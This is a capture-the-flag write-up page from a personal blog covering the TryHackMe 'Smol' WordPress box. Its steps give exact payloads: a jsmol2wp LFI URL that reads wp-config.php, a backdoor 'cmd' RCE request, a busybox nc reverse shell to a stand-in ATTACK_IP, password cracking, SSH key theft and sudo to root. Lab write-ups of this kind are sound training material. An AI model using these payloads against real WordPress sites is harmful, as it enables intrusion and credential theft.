@@ -1,0 +1,253 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Smol — WP Plugin SSRF to sudo Bash — writeup · 0xmrerror</title>
+  <meta name="description" content="A legacy WordPress plugin with a pile of CVEs, a poisoned Hello-Dolly backdoor, and an SSRF that reaches straight into the sudoers file." />
+  <link rel="canonical" href="https://0xmrerror.me/writeups/smol/" />
+  <meta name="author" content="Skandar Hadrich" />
+  <meta name="theme-color" content="#080b10" />
+
+  <meta property="og:type" content="article" />
+  <meta property="og:site_name" content="0xmrerror.me" />
+  <meta property="og:title" content="Smol — WP Plugin SSRF to sudo Bash — writeup · 0xmrerror" />
+  <meta property="og:description" content="A legacy WordPress plugin with a pile of CVEs, a poisoned Hello-Dolly backdoor, and an SSRF that reaches straight into the sudoers file." />
+  <meta property="og:url" content="https://0xmrerror.me/writeups/smol/" />
+  <meta property="og:image" content="https://0xmrerror.me/assets/og.png" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  <meta property="og:locale" content="en" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Smol — WP Plugin SSRF to sudo Bash — writeup · 0xmrerror" />
+  <meta name="twitter:description" content="A legacy WordPress plugin with a pile of CVEs, a poisoned Hello-Dolly backdoor, and an SSRF that reaches straight into the sudoers file." />
+  <meta name="twitter:image" content="https://0xmrerror.me/assets/og.png" />
+
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml" />
+  <link rel="apple-touch-icon" href="/assets/apple-touch-icon.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+
+  <link rel="preload" href="/fonts/inter-400-700.woff2" as="font" type="font/woff2" crossorigin />
+  <link rel="preload" href="/fonts/fira-code-400.woff2" as="font" type="font/woff2" crossorigin />
+  <link rel="stylesheet" href="/fonts/fonts.css" />
+  <link rel="stylesheet" href="/css/tokens.css" />
+  <link rel="stylesheet" href="/css/base.css" />
+  <link rel="stylesheet" href="/css/layout.css" />
+  <link rel="stylesheet" href="/css/components.css" />
+  <link rel="stylesheet" href="/css/writeups.css" media="all" />
+  <link rel="stylesheet" href="/css/print.css" media="print" />
+  <script>
+(function(){var d=document.documentElement;d.classList.add('js');
+try{var t=localStorage.getItem('0xmrerror:theme');
+if(!t||t==='auto'){t=matchMedia('(prefers-color-scheme: light)').matches?'light':'dark';}
+d.dataset.theme=t;var a=localStorage.getItem('0xmrerror:accent');if(a){d.dataset.accent=a;}
+var p=localStorage.getItem('0xmrerror:theme');if(p&&p!=='auto'){d.dataset.theme=p;}}catch(e){}})();
+</script>
+    <script type="application/ld+json">{
+    "@context": "https://schema.org",
+    "@type": "TechArticle",
+    "headline": "Smol \u2014 WP Plugin SSRF to sudo Bash",
+    "description": "A legacy WordPress plugin with a pile of CVEs, a poisoned Hello-Dolly backdoor, and an SSRF that reaches straight into the sudoers file.",
+    "url": "https://0xmrerror.me/writeups/smol/",
+    "author": {
+      "@type": "Person",
+      "name": "Skandar Hadrich",
+      "url": "https://0xmrerror.me"
+    },
+    "keywords": "Web, Medium, thm, wordpress, plugin-cve, ssrf, backdoor, sudoers, tryhackme",
+    "proficiencyLevel": "medium"
+  }</script>
+</head>
+<body>
+<a class="skip-link" href="#main">Skip to content</a>
+
+<div class="read-progress" data-read-progress aria-hidden="true"><i></i></div>
+
+<aside class="rail" aria-label="Section navigation">
+  <div class="rail-logo">0xmrerror<small>@hadrich</small></div>
+  <ul class="rail-nav" data-rail-nav>
+    <li><a class="rail-link" data-nav-link href="/#whoami">whoami</a></li><li><a class="rail-link" data-nav-link href="/#skills">skills</a></li><li><a class="rail-link" data-nav-link href="/#projects">projects</a></li><li><a class="rail-link" data-nav-link href="/#writeups">writeups</a></li><li><a class="rail-link" data-nav-link href="/#contact">contact</a></li>
+  </ul>
+  <div class="rail-progress" aria-hidden="true"><i></i></div>
+  <div class="rail-meta">
+    Tunis, Tunisia<br />
+    <span class="accent">available</span> — Feb 2027<br />
+    <a href="https://github.com/skandarhadrich-cell" rel="noopener">github</a> ·
+    <a href="https://linkedin.com/in/skandar-hadrich-128221369" rel="noopener">linkedin</a><br />
+    <button class="btn btn--sm btn--ghost" type="button" data-accent-toggle
+      style="margin-top:var(--sp-3);font-size:var(--fs-3xs);padding:4px 9px">accent</button>
+    <button class="btn btn--sm btn--ghost" type="button" data-theme-toggle data-theme-pref="auto"
+      style="font-size:var(--fs-3xs);padding:4px 9px">theme</button>
+  </div>
+</aside>
+<!-- palette entries (hidden, read by js/main.js) -->
+<ul class="sr-only" aria-hidden="true"><li class="palette-item" data-palette-item="whoami" data-palette-hint="section" data-palette-kind="section" href="/#whoami"></li><li class="palette-item" data-palette-item="skills" data-palette-hint="section" data-palette-kind="section" href="/#skills"></li><li class="palette-item" data-palette-item="projects" data-palette-hint="section" data-palette-kind="section" href="/#projects"></li><li class="palette-item" data-palette-item="writeups" data-palette-hint="section" data-palette-kind="section" href="/#writeups"></li><li class="palette-item" data-palette-item="contact" data-palette-hint="section" data-palette-kind="section" href="/#contact"></li><li class="palette-item" data-palette-item="Mr Robot CTF — WordPress to Root" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/mr-robot/"></li><li class="palette-item" data-palette-item="WWBuddy — SQLi to Env-Var Privesc" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/ww-buddy/"></li><li class="palette-item" data-palette-item="Broker — MQTT Eavesdrop to Webshell" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/broker/"></li><li class="palette-item" data-palette-item="Watcher — LFI to Root in 7 Flags" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/watcher/"></li><li class="palette-item" data-palette-item="Fortress — SHA-1 Collision to Root" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/fortress/"></li><li class="palette-item" data-palette-item="Umbrella — Registry Loot to SUID Bash" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/umbrella/"></li><li class="palette-item" data-palette-item="Super Secret Tip — Jinja SSTI to curl -K Root" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/super-secret-tip/"></li><li class="palette-item" data-palette-item="Smol — WP Plugin SSRF to sudo Bash" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/smol/"></li><li class="palette-item" data-palette-item="WinAntiDbg0x200 — Three Anti-Debug Checks" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/winantidbg0x200/"></li><li class="palette-item" data-palette-item="WinAntiDbg0x300 — UPX, a Watchdog, and an Infinite Loop" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/winantidbg0x300/"></li><li class="palette-item" data-palette-item="Binary Instrumentation 2 — Intercepting File Writes With Frida" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/binary-instrumentation-2/"></li><li class="palette-item" data-palette-item="Easy as GDB — Scripted Character-by-Character Brute Force" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/easy-as-gdb/"></li><li class="palette-item" data-palette-item="Keygenme — MD5 Hex Spliced Into a License Key" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/keygenme/"></li></ul>
+<nav id="nav" aria-label="Primary">
+  <div class="nav-inner">
+    <a class="nav-logo" href="/">0xmrerror<span>@terminal</span></a>
+    <ul class="nav-links" id="navLinks">
+      <li><a data-nav-link href="/#whoami">whoami</a></li><li><a data-nav-link href="/#skills">skills</a></li><li><a data-nav-link href="/#projects">projects</a></li><li><a data-nav-link href="/#writeups">writeups</a></li><li><a data-nav-link href="/#contact">contact</a></li>
+    </ul>
+    <div class="nav-actions">
+      <a class="btn btn--sm nav-cv" href="/cv.html">cv</a>
+      <button class="btn btn--icon btn--ghost" type="button" data-theme-toggle
+        data-theme-pref="auto" aria-label="Theme: system" title="Toggle theme">
+        <span aria-hidden="true">◐</span>
+      </button>
+      <button class="nav-toggle" id="navToggle" type="button"
+        aria-label="Toggle menu" aria-expanded="false" aria-controls="navLinks">
+        <span></span><span></span><span></span>
+      </button>
+    </div>
+  </div>
+</nav>
+
+<main id="main" class="wu">
+  <div class="container">
+    <a class="wu-back" href="/"><span aria-hidden="true">←</span> 0xmrerror@terminal:~/writeups</a>
+
+    <div class="wu-head">
+      <h1>Smol — WP Plugin SSRF to sudo Bash</h1>
+      <p class="wu-summary">A legacy WordPress plugin with a pile of CVEs, a poisoned Hello-Dolly backdoor, and an SSRF that reaches straight into the sudoers file.</p>
+      <div class="wu-meta">
+        <span class="badge-diff" data-diff="medium">Medium</span><span class="badge-platform" data-platform="thm">TryHackMe</span><span class="writeup-time">Web · 20 min read</span><a class="tag" href="/?type=web#writeups">wordpress</a><a class="tag" href="/?type=web#writeups">plugin-cve</a><a class="tag" href="/?type=web#writeups">ssrf</a><a class="tag" href="/?type=web#writeups">backdoor</a><a class="tag" href="/?type=web#writeups">sudoers</a><a class="tag" href="/?type=web#writeups">tryhackme</a>
+        <button class="flag-toggle" type="button" data-flag-toggle aria-pressed="false">🚩 hide flags</button>
+      </div>
+      <div class="series"><span>more web</span><a href="/writeups/mr-robot/">Mr Robot CTF</a><a href="/writeups/ww-buddy/">WWBuddy</a><a href="/writeups/broker/">Broker</a><a href="/writeups/watcher/">Watcher</a><a href="/writeups/fortress/">Fortress</a><a href="/writeups/umbrella/">Umbrella</a><a href="/writeups/super-secret-tip/">Super Secret Tip</a><a href="/writeups/smol/" class="is-current">Smol</a></div>
+    </div>
+
+    <div class="wu-layout">
+      <article class="prose" data-article>
+<h2>Smol — WordPress Plugin SSRF to sudo Bash</h2>
+<p>A WordPress site with a legacy plugin full of CVEs, a poisoned Hello-Dolly backdoor, and a chain of password reuse that ends at a full-sudo user. Goal: user + root flags.</p>
+
+<h3>1 · Enumeration</h3>
+<pre><code><span class="tok-comment"># The site redirects to a subdomain</span>
+<span class="tok-func">echo</span> "<span class="tok-string">10.10.x.x smol.thm www.smol.thm</span>" &gt;&gt; /etc/hosts
+
+<span class="tok-func">nmap</span> -sC -sV www.smol.thm
+22/tcp open  ssh   OpenSSH 8.2p1
+80/tcp open  http  Apache 2.4.41 (WordPress 6)
+
+<span class="tok-func">wpscan</span> --url http://www.smol.thm --enumerate u,vp
+<span class="tok-comment"># users: admin think wp diego gege xavi</span>
+<span class="tok-comment"># plugin jsmol2wp 1.07 → CVE-2018-20462 XSS, CVE-2018-20463 SSRF/LFI</span></code></pre>
+
+<h3>2 · LFI Through the Plugin</h3>
+<p>jsmol2wp's <code>query</code> param reads files via <code>php://filter</code>. Grab <code>wp-config.php</code> to win the web + DB credentials.</p>
+<pre><code><span class="tok-func">curl</span> "http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&amp;call=getRawDataFromDatabase&amp;query=php://filter/resource=../../../../wp-config.php"
+<span class="tok-comment"># &gt; wp-admin login / DB creds:  wpuser : kbLSF2Vop#lw3rjDZ629*Z%G</span></code></pre>
+
+<h3>3 · Backdoored Hello Dolly</h3>
+<p>A private post says to verify the "Hello Dolly" plugin source — this site's copy was tampered with. Read it through the LFI and decode to find a hidden <code>cmd</code> parameter backdoor. Result: unauthenticated RCE.</p>
+<pre><code><span class="tok-comment"># base64-encode read so PHP doesn't execute the file</span>
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&amp;call=getRawDataFromDatabase&amp;query=php://filter/convert.base64-encode/resource=../hello.php
+
+<span class="tok-comment"># decode → backdoor exposes a "cmd" parameter</span>
+http://www.smol.thm/wp-admin/index.php?cmd=<span class="tok-func">id</span>
+<span class="tok-comment"># &gt; uid=33(www-data) — RCE confirmed</span></code></pre>
+
+<h3>4 · Reverse Shell + DB Dump</h3>
+<pre><code><span class="tok-comment"># busybox nc keeps the payload short</span>
+http://www.smol.thm/wp-admin/index.php?cmd=busybox%20nc%20ATTACK_IP%20443%20-e%20sh
+<span class="tok-func">nc</span> -lvnp <span class="tok-num">443</span>
+<span class="tok-comment"># &gt; shell as www-data</span>
+
+<span class="tok-comment"># Reuse DB creds → dump wp_users → john + rockyou</span>
+<span class="tok-func">mysql</span> -u wpuser -p... wordpress -e <span class="tok-string">"SELECT user_login,user_pass FROM wp_users"</span>
+<span class="tok-func">john</span> hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+<span class="tok-comment"># &gt; diego : &lt;cracked&gt; — the @local account</span>
+<span class="tok-func">su</span> diego
+<span class="tok-func">find</span> / -name <span class="tok-string">'user.txt'</span>
+<span class="tok-comment"># &gt; user flag</span></code></pre>
+
+<h3>5 · diego → think (stolen SSH key)</h3>
+<p>Keep enumerating — another user's private key is world-readable. Grab <code>think</code>'s <code>id_rsa</code> and SSH in; think belongs to the <code>dev</code> and <code>internal</code> groups.</p>
+<pre><code><span class="tok-func">cat</span> /home/think/.ssh/id_rsa
+<span class="tok-func">chmod</span> <span class="tok-num">600</span> id_rsa
+<span class="tok-func">ssh</span> -i id_rsa think@smol.thm
+<span class="tok-comment"># think → groups: think, dev, internal</span></code></pre>
+
+<h3>6 · think → xavi (old zip + wp-config)</h3>
+<p>think's home contains <code>wordpress.old.zip</code>, password-protected. Crack it, unzip, and read the old <code>wp-config.php</code> — it leaks xavi's credentials.</p>
+<pre><code><span class="tok-func">zip2john</span> wordpress.old.zip &gt; zip.hash
+<span class="tok-func">john</span> zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
+<span class="tok-func">unzip</span> wordpress.old.zip
+<span class="tok-func">cat</span> wordpress.old/wp-config.php
+<span class="tok-comment"># &gt; xavi's password in the DB constants</span>
+<span class="tok-func">su</span> xavi</code></pre>
+
+<h3>7 · xavi → root</h3>
+<pre><code><span class="tok-func">sudo</span> -l
+(user xavi) (ALL : ALL) ALL
+<span class="tok-func">sudo</span> su
+root@smol:~# <span class="tok-func">cat</span> /root/root.txt
+<span class="tok-comment"># root flag</span></code></pre>
+
+<h3>8 · Retrospective</h3>
+<p>Attack chain: plugin LFI → wp-config creds → poisoned-plugin RCE → hash crack → SSH key theft → old-zip cred leak → full sudo. Lessons: drop stale plugins, review third-party code, and DB/SSH/zip password reuse makes the box one long sudo.</p>
+
+      </article>
+
+      <aside class="toc" data-toc-wrap>
+        <nav class="toc" data-toc aria-label="On this page">
+          <h2>on this page</h2>
+        </nav>
+      </aside>
+    </div>
+
+    <nav class="wu-nav" aria-label="More writeups">
+      <a class="prev" href="/writeups/super-secret-tip/"><small>← previous</small><span>Super Secret Tip — Jinja SSTI to curl -K Root</span></a>
+      <a class="next" href="/writeups/winantidbg0x200/"><small>next →</small><span>WinAntiDbg0x200 — Three Anti-Debug Checks</span></a>
+    </nav>
+  </div>
+</main>
+
+<footer class="site-footer">
+  <div class="container">
+    <div class="footer-inner">
+      <div class="footer-prompt">
+        <b>0xmrerror</b>@terminal:~$ <span aria-hidden="true">█</span>
+        <p class="footer-note">Hosted on GitHub Pages. Built with no framework, no build server, no trackers.</p>
+      </div>
+      <div class="footer-cols">
+        <div class="footer-col">
+          <h4>site</h4>
+          <ul>
+            <li><a href="/">home</a></li>
+            <li><a href="/#writeups">writeups</a></li>
+            <li><a href="/cv.html">cv</a></li>
+            <li><a href="/feed.xml">rss</a></li>
+            <li><a href="/sitemap.xml">sitemap</a></li>
+          </ul>
+        </div>
+        <div class="footer-col">
+          <h4>elsewhere</h4>
+          <ul>
+            <li><a href="https://github.com/skandarhadrich-cell" rel="noopener">github</a></li>
+            <li><a href="https://linkedin.com/in/skandar-hadrich-128221369" rel="noopener">linkedin</a></li>
+            <li><a href="mailto:skandar.hadrich@etudiant.enit.utm.tn">email</a></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+    <div class="footer-base">
+      <span>© 2026 Skandar Hadrich · MIT licensed</span>
+      <span>since <span data-since="2026-02-09" data-since-prefix="">—</span> on GitHub</span>
+    </div>
+  </div>
+</footer>
+<div class="palette" id="palette" role="dialog" aria-modal="true" aria-label="Command palette">
+  <div class="palette-box">
+    <input class="palette-input" id="paletteInput" type="text" placeholder="jump to a section or search writeups…"
+      autocomplete="off" spellcheck="false" aria-label="Search sections and writeups" />
+    <ul class="palette-list" id="paletteList" role="listbox" aria-label="Results"></ul>
+    <div class="palette-foot">
+      <span><b>↑↓</b> navigate</span><span><b>↵</b> open</span><span><b>esc</b> close</span>
+    </div>
+  </div>
+</div>
+<script src="/js/main.js" defer></script>
+<script src="/js/writeups.js" defer></script>
+</body>
+</html>
